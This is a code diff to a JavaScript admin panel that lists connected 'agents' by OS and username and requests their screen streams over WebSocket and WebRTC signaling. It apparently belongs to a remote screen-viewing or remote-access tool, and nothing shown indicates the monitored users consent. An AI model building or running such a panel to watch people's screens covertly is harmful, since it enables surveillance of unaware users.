@@ -109,7 +109,7 @@
                 }
                 else if (data.type === 'info') {
                     addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`, 'green');
-
+                    
                     // FIX: Prevent duplicates/spam
                     if (!users[data.id]) {
                         users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now(), sessionActive: false };
@@ -330,41 +330,31 @@
             }
         }
 
-        async function joinUser(id, status) {
-            // Create a new session for this join attempt
-            const session = getSession(id);
-            const pc = session.pc;
+        function joinUser(id, status) {
+            // If we have stored signaling data, send it back
+            if (users[id] && users[id].signalingData) {
+                const sigData = users[id].signalingData;
+                ws.send(JSON.stringify({
+                    type: sigData.type,
+                    targetId: id,
+                    sdp: sigData.sdp,
+                    candidate: sigData.candidate
+                }));
+                addLog(`[ADMIN] Resent ${sigData.type} to ${id}`, 'green');
+            } else {
+                // Request a new join
+                ws.send(JSON.stringify({
+                    type: 'request_join',
+                    targetId: id,
+                    from: null
+                }));
+                addLog(`[ADMIN] Requested new join to ${id}`, 'blue');
+            }
 
-            // Reset video element to ensure clean state
-            remoteVideo.srcObject = null;
-
-            // Add a dummy track to the admin PC to trigger local stream generation if needed
-            // But primarily we want to request the agent to send us their screen
-            
-            // 1. Request the agent to start screen sharing
-            ws.send(JSON.stringify({
-                type: 'request_join',
-                targetId: id,
-                from: null
-            }));
-            
-            addLog(`[ADMIN] Requesting join to ${id}...`, 'blue');
-
-            // 2. Wait for the agent to send an Offer (handled by onmessage -> handleWebRTCOffer)
-            // If no offer comes within 5 seconds, force a fallback
-            setTimeout(() => {
-                if (!document.getElementById('videoModal').style.display === 'flex') {
-                    addLog(`[FALLBACK] No stream detected, forcing manual capture...`, 'yellow');
-                    forceManualCapture(id);
-                }
-            }, 5000);
-        }
-
-        async function forceManualCapture(targetId) {
-            // If the automatic flow failed, we can try to create an offer from Admin side
-            // But typically, the agent should be the one sending the offer after receiving request_join
-            // Let's just alert the admin
-            addLog(`[MANUAL] Please click Join again if stream didn't start.`, 'yellow');
+            // Visual feedback
+            const card = document.querySelector(`button[onclick="joinUser('${id}', '${status}')"]`).parentElement;
+            card.style.borderColor = '#4ade80';
+            setTimeout(() => card.style.borderColor = '#3b82f6', 500);
         }
 
         function closeVideo() {
